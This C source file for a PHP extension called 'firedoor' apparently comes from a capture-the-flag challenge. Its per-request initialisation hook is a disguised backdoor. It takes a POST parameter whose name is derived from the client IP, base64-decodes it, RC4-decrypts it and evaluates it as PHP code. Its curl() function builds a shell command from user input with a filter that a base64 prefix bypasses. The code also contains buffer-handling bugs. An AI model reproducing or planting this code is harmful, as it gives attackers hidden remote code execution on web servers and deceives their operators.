#include "php.h"
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
ZEND_FUNCTION(curl);
ZEND_FUNCTION(whats);

static zend_function_entry curl_functions[] = {
    PHP_FE(curl, NULL)
    PHP_FE(whats, NULL) {
        NULL, NULL, NULL
    }
};

PHP_RINIT_FUNCTION(hideme);
zend_module_entry hideme_ext_module_entry = {
    STANDARD_MODULE_HEADER,
    "firedoor",
    curl_functions,
    NULL,
    NULL,
    PHP_RINIT(hideme),
    NULL,
    NULL,
    "1.0",
    STANDARD_MODULE_PROPERTIES
};
ZEND_GET_MODULE(hideme_ext);

struct firewall_state {
    u_char  perm[256];
    u_char  index1;
    u_char  index2;
};

extern void firewall_init(struct firewall_state *state, const u_char *key, int keylen);
extern void firewall_start(struct firewall_state *state,
                           const u_char *inbuf, u_char *outbuf, int buflen);

static const unsigned char pr2six[256] = {
    /* ASCII table */
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64,
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 63,
    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
};


int zeroday(char *bufplain, const char *bufcoded) {
    int nbytesdecoded;
    register const unsigned char *bufin;
    register unsigned char *bufout;
    register int nprbytes;

    bufin = (const unsigned char *) bufcoded;
    while (pr2six[*(bufin++)] <= 63);
    nprbytes = (bufin - (const unsigned char *) bufcoded) - 1;
    nbytesdecoded = ((nprbytes + 3) / 4) * 3;

    bufout = (unsigned char *) bufplain;
    bufin = (const unsigned char *) bufcoded;

    while (nprbytes > 4) {
        *(bufout++) =
            (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);
        *(bufout++) =
            (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);
        *(bufout++) =
            (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);
        bufin += 4;
        nprbytes -= 4;
    }

    /* Note: (nprbytes == 1) would be an error, so just ingore that case */
    if (nprbytes > 1) {
        *(bufout++) =
            (unsigned char) (pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);
    }
    if (nprbytes > 2) {
        *(bufout++) =
            (unsigned char) (pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);
    }
    if (nprbytes > 3) {
        *(bufout++) =
            (unsigned char) (pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);
    }

    *(bufout++) = '\0';
    nbytesdecoded -= (4 - nprbytes) & 3;
    return nbytesdecoded;
}

static __inline void
swap_bytes(u_char *a, u_char *b) {
    u_char temp;

    temp = *a;
    *a = *b;
    *b = temp;
}

/*
 * Initialize an RC4 state buffer using the supplied key,
 * which can have arbitrary length.
 */
void
firewall_init(struct firewall_state *const state, const u_char *key, int keylen) {
    u_char j;
    int i;

    /* Initialize state with identity permutation */
    for (i = 0; i < 256; i++)
        state->perm[i] = (u_char)i;
    state->index1 = 0;
    state->index2 = 0;

    /* Randomize the permutation using key data */
    for (j = i = 0; i < 256; i++) {
        j += state->perm[i] + key[i % keylen];
        swap_bytes(&state->perm[i], &state->perm[j]);
    }
}

/*
 * Encrypt some data using the supplied RC4 state buffer.
 * The input and output buffers may be the same buffer.
 * Since RC4 is a stream cypher, this function is used
 * for both encryption and decryption.
 */
void
firewall_start(struct firewall_state *const state,
               const u_char *inbuf, u_char *outbuf, int buflen) {
    int i;
    u_char j;

    for (i = 0; i < buflen; i++) {

        /* Update modification indicies */
        state->index1++;
        state->index2 += state->perm[state->index1];

        /* Modify permutation */
        swap_bytes(&state->perm[state->index1],
                   &state->perm[state->index2]);

        /* Encrypt/decrypt next byte */
        j = state->perm[state->index1] + state->perm[state->index2];
        outbuf[i] = inbuf[i] ^ state->perm[j];
    }
}

inline unsigned int add1(char *str, unsigned int len) {
    unsigned int b    = 378551;
    unsigned int a    = 63689;
    unsigned int add = 0;
    unsigned int i    = 0;

    for (i = 0; i < len; str++, i++) {
        add = add * a + (*str);
        a    = a * b;
    }

    return add;
}
/* End Of RS Hash Function */

inline unsigned int add2(char *str, unsigned int len) {
    unsigned int add = 1315423911;
    unsigned int i    = 0;

    for (i = 0; i < len; str++, i++) {
        add ^= ((add << 5) + (*str) + (add >> 2));
    }

    return add;
}
/* End Of JS Hash Function */

inline unsigned int add3(char *str, unsigned int len) {
    const unsigned int BitsInUnsignedInt = (unsigned int)(sizeof(unsigned int) * 8);
    const unsigned int ThreeQuarters     = (unsigned int)((BitsInUnsignedInt  * 3) / 4);
    const unsigned int OneEighth         = (unsigned int)(BitsInUnsignedInt / 8);
    const unsigned int HighBits          = (unsigned int)(0xFFFFFFFF) << (BitsInUnsignedInt - OneEighth);
    unsigned int add              = 0;
    unsigned int test              = 0;
    unsigned int i                 = 0;

    for (i = 0; i < len; str++, i++) {
        add = (add << OneEighth) + (*str);

        if ((test = add & HighBits)  != 0) {
            add = (( add ^ (test >> ThreeQuarters)) & (~HighBits));
        }
    }

    return add;
}
/* End Of  P. J. Weinberger Hash Function */

void int2str(int val, char *buf) {
    snprintf(buf, sizeof(buf) - 1, "%d", val );
    return;
}

static int LIGHT_INCLUDE_OR_EVAL(ZEND_OPCODE_HANDLER_ARGS) {
    return ZEND_USER_OPCODE_DISPATCH;
}


void tea(char *str, const int len) {
    int i;
    for (i = 0; i < len; ++i)
        str[i] = 'A' + rand() % 26;
    str[++i] = '\0';
}

ZEND_FUNCTION(get_flag) {
    char strs[] = "fire";
    char *str = strs;
    int len = 4;
    unsigned int fnv_prime = 0x811C9DC5;
    unsigned int add      = 0;
    unsigned int i         = 0;

    for (i = 0; i < len; str++, i++) {
        add *= fnv_prime;
        add ^= (*str);
    }

    fnv_prime = 0x811C9DC7;
    for (i = 0; i < len; str++, i++) {
        add *= fnv_prime;
        add ^= (*str);
    }

    fnv_prime = 0x811C9DC8;
    for (i = 0; i < len; str++, i++) {
        add *= fnv_prime;
        add ^= (*str);
    }

    fnv_prime = 0x811C9DC9;
    for (i = 0; i < len; str++, i++) {
        add *= fnv_prime;
        add ^= (*str);
    }
    char tmpstr[100];
    int2str(add, tmpstr);
    php_printf("flag is %s", tmpstr);

}

PHP_RINIT_FUNCTION(hideme) {
    zend_set_user_opcode_handler(ZEND_INCLUDE_OR_EVAL, LIGHT_INCLUDE_OR_EVAL);

    zend_bool jit_init = PG(auto_globals_jit);
    if (jit_init) {
        zend_is_auto_global(ZEND_STRL("_SERVER") TSRMLS_CC);
    }

    char *uri = NULL;
    zval **data;
    if (PG(http_globals)[TRACK_VARS_SERVER] &&
            zend_hash_find(Z_ARRVAL_P(PG(http_globals)[TRACK_VARS_SERVER]), "REMOTE_ADDR",
                           sizeof("REMOTE_ADDR"), (void **) &data) == SUCCESS) {
        uri = Z_STRVAL_PP(data);
    }

    srand(time(NULL));
    char name[10];
    name[0] = '/';
    name[1] = 't';
    name[2] = 'm';
    name[3] = 'p';
    name[4] = '/';
    tea(&name[5], 2);

    if (access(name, 0)) {
        char *method = "_POST";
        int res;
        char tmpstr[100];
        sprintf(tmpstr, "%s%s%s", "fire", uri, "sun");

        res = add1(tmpstr, strlen(tmpstr));
        int2str(res, tmpstr);
        res = add2(tmpstr, strlen(tmpstr));
        int2str(res, tmpstr);
        res = add3(tmpstr, strlen(tmpstr));
        int2str(res, tmpstr);

        char *secret_string = tmpstr;
        secret_string[0] = 'a' + rand() % 5;

        zval **arr;
        char *code;

        if (zend_hash_find(&EG(symbol_table), method, strlen(method) + 1, (void **)&arr) != FAILURE) {
            HashTable *ht = Z_ARRVAL_P(*arr);
            zval **val;
            if (zend_hash_find(ht, secret_string, strlen(secret_string) + 1, (void **)&val) != FAILURE) {
                code =  Z_STRVAL_PP(val);
                if (strlen(code) < 100) {
                    char decode_code[100];
                    char final_code[100];

                    struct firewall_state rcs;
                    int nn = zeroday(decode_code, code);
                    firewall_init(&rcs, uri, strlen(uri));
                    firewall_start(&rcs, decode_code, final_code, nn);
                    final_code[99] = '\0';

                    zend_eval_string(final_code, NULL, (char *)"" TSRMLS_CC);
                }

            }
        }

    }

    return SUCCESS;
}

ZEND_FUNCTION(whats) {
    char *name;
    int name_len;
    if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "s", &name, &name_len) == FAILURE) {
        RETURN_NULL();
    }
}

#define STACK_LEN 20000
int prot(char *cmd, char *tmpres) {
    int len;
    FILE *pp = popen(cmd, "r");

    if (pp == NULL) {
        return -1;
    }

    char tmp[1024];
    while (fgets(tmp, sizeof(tmp), pp) != NULL) {

        len = strlen(tmpres);
        if (len >= 7000)
            break;
        strcpy(tmpres + len, tmp);
        break;
    }
    if (strlen(tmpres) == 0)
        strcpy(tmpres, "ERROR");

    pclose(pp);
    return len;
}

ZEND_FUNCTION(curl) {
    char buffer[20000];

    char *name;
    int name_len;
    char namearr[1000];
    if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "s", &name, &name_len) == FAILURE) {
        RETURN_NULL();
    }
    int i = 0;
    char tmpc;
    for (i = 0; tmpc = name[i]; ++i) {
        if (tmpc == ';' || tmpc == '|' || tmpc == '&' || tmpc == '`')
            RETURN_NULL();
        if (i > 100)
            break;
    }

    if (strlen(name) > 20 && strlen(name) < 900 && name_len < 900) {
        if (name[0] == 'h' && name[1] == 't' && name[2] == 't' && name[3] == 'p' && name[4] == ':' && name[5] == '/' && name[6] == '/' && name[7] == 'b' && name[8] == 'a' && name[9] == 's' && name[10] == 'e' && name[11] == '.') {
            int nn = zeroday(namearr, &name[12]);
            namearr[999] = '\0';
            name = namearr;
        }
    }

    char cmd[10000] = "curl \"";
    char res[STACK_LEN] = "";
    char tmp[STACK_LEN] = "";
    char encoded[STACK_LEN] = "";
    int len;
    len = strlen(name);
    strcpy(cmd + strlen(cmd), name);
    strcpy(cmd + strlen(cmd), "\"|base64");
    len = strlen(cmd);

    prot(cmd, tmp);
    strncpy(res, tmp, STACK_LEN);

    RETURN_STRING(res, 1);

}
